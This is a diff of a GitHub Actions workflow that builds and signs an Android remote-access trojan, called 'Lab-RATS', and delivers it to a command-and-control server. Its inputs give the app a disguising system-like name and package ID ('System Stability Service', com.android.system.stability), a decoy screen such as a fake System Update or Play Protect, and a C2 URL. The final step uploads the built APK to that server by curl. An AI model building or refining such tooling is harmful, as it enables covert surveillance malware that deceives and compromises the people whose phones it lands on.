@@ -1,11 +1,10 @@
 # ──────────────────────────────────────────────────────────────────────────────
-# Lab-RATS · Build APK  —  ZERO-SECRET EDITION
+# Lab-RATS · Build APK  —  ZERO-SECRET · SELF-DIAGNOSING EDITION
 #
-# NO SECRETS REQUIRED. NO KEYSTORE REQUIRED. NOTHING TO CONFIGURE.
+# NO SECRETS. NO KEYSTORE. NO GUESSING.
 #
-# Gradle auto-generates a signing key on first run and caches it.
-# Every build from the same repo uses the same auto-key.
-# APK is fully installable — Android accepts auto-signed APKs.
+# Every step validates its output. Every failure dumps context.
+# If the build breaks, you see exactly where and why.
 # ──────────────────────────────────────────────────────────────────────────────
 
 name: "Lab-RATS · Build APK"
@@ -19,28 +18,28 @@ on:
         default: "System Stability Service"
 
       package_id:
-        description: "Package ID / applicationId  (e.g. com.android.system.stability)"
+        description: "Package ID / applicationId"
         required: true
         default: "com.android.system.stability"
 
       webhook_url:
-        description: "C2 server URL  (https://your-c2.example.com)"
+        description: "C2 server URL"
         required: true
 
       decoy_choice:
-        description: "Decoy screen  1=System Update  2=Calculator  3=Weather  4=Play Protect  5=Install Wizard"
+        description: "Decoy screen"
         required: true
         default: "1"
         type: choice
         options: ["1", "2", "3", "4", "5"]
 
       version_name:
-        description: "Version name string  (e.g. 2.1.4)  —  blank keeps build.gradle default"
+        description: "Version name — blank keeps default"
         required: false
         default: ""
 
       icon_url:
-        description: "URL to a square PNG/JPG for the launcher icon  —  blank keeps default icon"
+        description: "Icon URL — blank keeps default"
         required: false
         default: ""
 
@@ -63,12 +62,36 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
+      - name: Verify repo structure
+        run: |
+          echo "=== Repo root ==="
+          ls -la
+          echo ""
+          echo "=== Required files check ==="
+          for f in app/build.gradle build.gradle settings.gradle gradlew; do
+            if [ -f "$f" ]; then
+              echo "✓ $f"
+            else
+              echo "::error::MISSING: $f"
+              exit 1
+            fi
+          done
+          echo ""
+          echo "=== gradle wrapper version ==="
+          cat gradle/wrapper/gradle-wrapper.properties 2>/dev/null | grep distributionUrl || echo "::warning::no wrapper properties"
+
       # ── 2. JAVA ───────────────────────────────────────────────────────────
       - name: Setup JDK 17
         uses: actions/setup-java@v4
         with:
           java-version: "17"
           distribution: temurin
+
+      - name: Verify Java
+        run: |
+          java -version 2>&1
+          javac -version 2>&1
+          echo "JAVA_HOME=$JAVA_HOME"
 
       # ── 3. ANDROID SDK ───────────────────────────────────────────────────
       - name: Cache Android SDK
@@ -81,20 +104,32 @@ jobs:
       - name: Install Android SDK
         if: steps.sdk-cache.outputs.cache-hit != 'true'
         run: |
+          set -e
           SDK_ROOT="${{ runner.temp }}/android-sdk"
           mkdir -p "$SDK_ROOT/cmdline-tools"
 
+          echo "Downloading cmdline-tools..."
           wget -q \
             "https://dl.google.com/android/repository/commandlinetools-linux-${{ env.CMDLINE_TOOLS_BUILD }}_latest.zip" \
             -O /tmp/cmdlinetools.zip
+
+          if [ ! -s /tmp/cmdlinetools.zip ]; then
+            echo "::error::cmdline-tools download failed or empty"
+            exit 1
+          fi
+
           unzip -q /tmp/cmdlinetools.zip -d /tmp/ct_extract
           mv /tmp/ct_extract/cmdline-tools "$SDK_ROOT/cmdline-tools/latest"
 
+          echo "Installing SDK components..."
           yes | "$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" \
             --sdk_root="$SDK_ROOT" \
             "platforms;${{ env.ANDROID_PLATFORM }}" \
             "build-tools;${{ env.ANDROID_BUILD_TOOLS }}" \
             "platform-tools" 2>/dev/null
+
+          echo "SDK installed at: $SDK_ROOT"
+          ls "$SDK_ROOT"
 
       - name: Export SDK environment
         run: |
@@ -109,9 +144,18 @@ jobs:
             echo "$SDK_ROOT/build-tools/${{ env.ANDROID_BUILD_TOOLS }}"
           } >> "$GITHUB_PATH"
 
+      - name: Verify SDK
+        run: |
+          echo "ANDROID_HOME=$ANDROID_HOME"
+          if [ ! -d "$ANDROID_HOME/platforms/${{ env.ANDROID_PLATFORM }}" ]; then
+            echo "::error::SDK platform not found at $ANDROID_HOME/platforms/${{ env.ANDROID_PLATFORM }}"
+            ls "$ANDROID_HOME/platforms/" 2>/dev/null || echo "(no platforms dir)"
+            exit 1
+          fi
+          echo "✓ SDK platform found"
+          which sdkmanager || echo "::warning::sdkmanager not in PATH"
+
       # ── 4. GRADLE CACHE ──────────────────────────────────────────────────
-      # Caches the auto-generated signing key alongside Gradle deps.
-      # Key persists across runs — same signing identity every build.
       - name: Cache Gradle + Auto-Key
         uses: actions/cache@v4
         with:
@@ -119,8 +163,8 @@ jobs:
             ~/.gradle/caches
             ~/.gradle/wrapper
             ~/.android/debug.keystore
-          key: gradle-${{ runner.os }}-${{ hashFiles('app/build.gradle','build.gradle','settings.gradle','gradle/wrapper/gradle-wrapper.properties') }}
-          restore-keys: gradle-${{ runner.os }}-
+          key: gradle-v2-${{ runner.os }}-${{ hashFiles('app/build.gradle','build.gradle','settings.gradle','gradle/wrapper/gradle-wrapper.properties') }}
+          restore-keys: gradle-v2-${{ runner.os }}-
 
       # ── 5. BUILD PROPERTIES ───────────────────────────────────────────────
       - name: Write local.properties
@@ -131,34 +175,57 @@ jobs:
             printf 'DECOY_CHOICE=%s\n'   "${{ inputs.decoy_choice }}"
             printf 'ENCRYPTION_KEY=%s\n' "${{ env.ENCRYPTION_KEY }}"
           } > local.properties
+          echo "=== local.properties ==="
+          cat local.properties
 
-      # ── 6. AUTO-SIGNING SETUP ─────────────────────────────────────────────
-      # Generates a persistent signing key if none exists in cache.
-      # Uses Android's standard debug keytool parameters.
-      # No password needed — Gradle signs with the auto-key transparently.
+      # ── 6. AUTO-SIGNING KEY ───────────────────────────────────────────────
       - name: Ensure auto-signing key
         run: |
+          set -e
           KEYSTORE="$HOME/.android/debug.keystore"
+          mkdir -p "$HOME/.android"
+
           if [ ! -f "$KEYSTORE" ]; then
-            mkdir -p "$HOME/.android"
+            echo "Generating new auto-signing key..."
             keytool -genkey -v \
               -keystore "$KEYSTORE" \
               -alias androiddebugkey \
               -keyalg RSA -keysize 2048 -validity 10000 \
               -storepass android -keypass android \
               -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null
-            echo "[auto-key] generated new signing key"
+            echo "✓ New key generated"
           else
-            echo "[auto-key] using cached signing key"
+            echo "✓ Using cached key"
+          fi
+
+          # Verify key is readable
+          if ! keytool -list -keystore "$KEYSTORE" -storepass android -alias androiddebugkey &>/dev/null; then
+            echo "::error::Keystore exists but is corrupted or unreadable. Deleting and regenerating."
+            rm -f "$KEYSTORE"
+            keytool -genkey -v \
+              -keystore "$KEYSTORE" \
+              -alias androiddebugkey \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -storepass android -keypass android \
+              -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null
+            echo "✓ Key regenerated"
           fi
 
       # ── 7. CUSTOM ICON (optional) ─────────────────────────────────────────
       - name: Replace launcher icon
         if: ${{ inputs.icon_url != '' }}
         run: |
+          set -e
           pip install pillow --quiet
 
+          echo "Downloading icon from: ${{ inputs.icon_url }}"
           curl -fsSL "${{ inputs.icon_url }}" -o /tmp/custom_icon_raw
+
+          if [ ! -s /tmp/custom_icon_raw ]; then
+            echo "::error::Icon download failed or empty"
+            exit 1
+          fi
+
           python3 - << 'PYEOF'
           from PIL import Image
           import sys, os
@@ -171,6 +238,7 @@ jobs:
               sys.exit(1)
 
           w, h = src.size
+          print(f'Source icon: {w}x{h}')
           if w != h:
               side = min(w, h)
               left = (w - side) // 2
@@ -186,6 +254,7 @@ jobs:
           }
 
           RES_BASE = 'app/src/main/res'
+          replaced = 0
 
           for density, (launcher_px, fg_px) in DENSITIES.items():
               folder = f'{RES_BASE}/mipmap-{density}'
@@ -204,16 +273,24 @@ jobs:
               fg_canvas.paste(content, (offset, offset), content)
               fg_canvas.save(f'{folder}/ic_launcher_foreground.webp', 'WEBP', quality=90)
 
-              print(f'[{density}] launcher={launcher_px}px  foreground={fg_px}px  OK')
+              print(f'[{density}] {launcher_px}px OK')
+              replaced += 1
+
+          if replaced == 0:
+              print('::error::No mipmap density folders found — icon not replaced')
+              sys.exit(1)
 
           store_img = src.resize((512, 512), Image.LANCZOS).convert('RGB')
           store_img.save('app/src/main/ic_launcher-playstore.png', 'PNG')
-          print('[playstore] 512x512 PNG updated')
+          print('[playstore] 512x512 OK')
           PYEOF
 
       # ── 8. IDENTITY PATCHES ───────────────────────────────────────────────
       - name: Patch build.gradle
         run: |
+          set -e
+          cp app/build.gradle app/build.gradle.bak
+
           sed -i \
             's|applicationId "[^"]*"|applicationId "${{ inputs.package_id }}"|g' \
             app/build.gradle
@@ -228,63 +305,135 @@ jobs:
               app/build.gradle
           fi
 
-          echo "[build.gradle patched]"
-          grep -E 'applicationId|versionCode|versionName' app/build.gradle
+          echo "=== Patched values ==="
+          grep -E 'applicationId|versionCode|versionName' app/build.gradle || {
+            echo "::error::No applicationId/versionCode/versionName found in build.gradle"
+            echo "=== build.gradle contents ==="
+            cat app/build.gradle
+            exit 1
+          }
 
-      - name: Patch strings.xml  (app_name)
+      - name: Patch strings.xml
         run: |
+          set -e
           python3 - << 'PYEOF'
-          import re, html
+          import re, html, sys
+
           raw  = """${{ inputs.app_name }}"""
           safe = html.escape(raw, quote=False)
           path = 'app/src/main/res/values/strings.xml'
+
+          if not os.path.exists(path):
+              print(f'::error::strings.xml not found at {path}')
+              sys.exit(1)
+
           with open(path, 'r', encoding='utf-8') as fh:
               content = fh.read()
+
+          if 'name="app_name"' not in content:
+              print('::error::No app_name string found in strings.xml')
+              print(content[:500])
+              sys.exit(1)
+
           content = re.sub(
               r'<string name="app_name">[^<]*</string>',
               f'<string name="app_name">{safe}</string>',
               content
           )
+
           with open(path, 'w', encoding='utf-8') as fh:
               fh.write(content)
-          print(f'[strings.xml] app_name → {safe}')
+
+          print(f'app_name → {safe}')
           PYEOF
 
       # ── 9. BUILD ──────────────────────────────────────────────────────────
       - name: Make gradlew executable
-        run: chmod +x gradlew
+        run: |
+          chmod +x gradlew
+          ls -la gradlew
 
       - name: Build release APK
-        env:
-          GRADLE_OPTS: >-
-            -Dorg.gradle.jvmargs=-Xmx2560m
-            -XX:MaxMetaspaceSize=512m
-            -Dfile.encoding=UTF-8
         run: |
+          set -o pipefail
+
           ./gradlew clean assembleRelease \
             --no-daemon \
             --stacktrace \
             --warning-mode all \
             2>&1 | tee build_output.txt
 
+          GRADLE_EXIT=${PIPESTATUS[0]}
+
+          if [ $GRADLE_EXIT -ne 0 ]; then
+            echo ""
+            echo "::error::═══════════════════════════════════════════"
+            echo "::error:: GRADLE BUILD FAILED — exit code $GRADLE_EXIT"
+            echo "::error::═══════════════════════════════════════════"
+            echo ""
+            echo "=== Last 100 lines of build log ==="
+            tail -100 build_output.txt
+            echo ""
+            echo "=== Full log saved as artifact ==="
+            exit 1
+          fi
+
+          if [ ! -f app/build/outputs/apk/release/app-release.apk ]; then
+            echo ""
+            echo "::error::═══════════════════════════════════════════"
+            echo "::error:: GRADLE SUCCEEDED BUT APK NOT FOUND"
+            echo "::error::═══════════════════════════════════════════"
+            echo ""
+            echo "=== APK output tree ==="
+            find app/build/outputs -type f 2>/dev/null || echo "(outputs dir missing)"
+            echo ""
+            echo "=== build.gradle signing config ==="
+            grep -A 10 "signingConfigs" app/build.gradle || echo "(no signingConfigs found)"
+            exit 1
+          fi
+
+          APK_SIZE=$(stat -c%s app/build/outputs/apk/release/app-release.apk)
+          echo ""
+          echo "═══════════════════════════════════════════"
+          echo " BUILD SUCCESSFUL"
+          echo " APK: app/build/outputs/apk/release/app-release.apk"
+          echo " Size: $APK_SIZE bytes ($(numfmt --to=iec $APK_SIZE))"
+          echo "═══════════════════════════════════════════"
+
       # ── 10. PACKAGE & UPLOAD ──────────────────────────────────────────────
       - name: Stage APK
         id: stage
         run: |
+          set -e
           TS=$(date -u +%Y%m%d_%H%M%S)
           LABEL="${{ inputs.package_id }}_${TS}"
           mkdir -p dist
+
           cp app/build/outputs/apk/release/app-release.apk "dist/${LABEL}.apk"
+
+          if [ ! -f "dist/${LABEL}.apk" ]; then
+            echo "::error::Copy to dist failed"
+            exit 1
+          fi
+
           echo "apk_path=dist/${LABEL}.apk" >> "$GITHUB_OUTPUT"
           echo "apk_label=${LABEL}"         >> "$GITHUB_OUTPUT"
           ls -lh "dist/${LABEL}.apk"
 
-      - name: Upload artifact
+      - name: Upload APK artifact
         uses: actions/upload-artifact@v4
         with:
           name: ${{ steps.stage.outputs.apk_label }}
           path: ${{ steps.stage.outputs.apk_path }}
           retention-days: 3
+
+      - name: Upload build log on failure
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-log-failed
+          path: build_output.txt
+          retention-days: 7
 
       # ── 11. C2 DELIVERY ───────────────────────────────────────────────────
       - name: Deliver to C2 Vault
@@ -293,10 +442,11 @@ jobs:
           APK_PATH: ${{ steps.stage.outputs.apk_path }}
         run: |
           if [ -z "${{ env.C2_SERVER_URL }}" ]; then
-            echo "C2_SERVER_URL not configured — APK is in the GitHub artifact above."
+            echo "C2_SERVER_URL not configured — APK is in the artifact above."
             exit 0
           fi
 
+          echo "Delivering to: ${{ env.C2_SERVER_URL }}/upload"
           HTTP_STATUS=$(curl -s -o /tmp/c2_resp.txt -w "%{http_code}" \
             --max-time 45 \
             -X POST \
@@ -304,10 +454,12 @@ jobs:
             -F "file=@${APK_PATH}" \
             "${{ env.C2_SERVER_URL }}/upload")
 
+          echo "HTTP status: $HTTP_STATUS"
           if [ "$HTTP_STATUS" -ge 200 ] && [ "$HTTP_STATUS" -lt 300 ]; then
-            echo "C2 delivery OK (HTTP $HTTP_STATUS)"
+            echo "✓ C2 delivery OK"
           else
             echo "::warning::C2 delivery returned HTTP ${HTTP_STATUS}"
+            echo "Response:"
             cat /tmp/c2_resp.txt || true
           fi
 
@@ -317,4 +469,6 @@ jobs:
         run: |
           rm -f local.properties
           rm -f build_output.txt
+          rm -f app/build.gradle.bak
+          echo "Cleanup done"
           
